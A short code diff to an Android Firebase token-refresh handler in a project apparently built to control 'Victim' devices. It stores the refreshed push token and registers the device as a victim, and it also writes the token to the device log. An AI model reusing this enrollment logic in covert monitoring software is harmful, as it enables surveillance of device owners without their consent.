@@ -7,6 +7,7 @@ import android.util.Log;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.iid.FirebaseInstanceIdService;
+import com.theah64.xrob.interfaces.JobListener;
 import com.theah64.xrob.models.Victim;
 import com.theah64.xrob.utils.PrefUtils;
 
@@ -16,9 +17,10 @@ public class InstanceIdService extends FirebaseInstanceIdService {
 
     @Override
     public void onTokenRefresh() {
+
         final String refreshedToken = FirebaseInstanceId.getInstance().getToken();
-        Log.d(X, "Refreshed token" + refreshedToken);
+        Log.i(X, "Firebase token refreshed : " + refreshedToken);
         PrefUtils.getInstance(this).getEditor().putString(Victim.KEY_FCM_ID, refreshedToken).commit();
-        Victim.setFcmId(refreshedToken);
+        Victim.register(this, null);
     }
 }
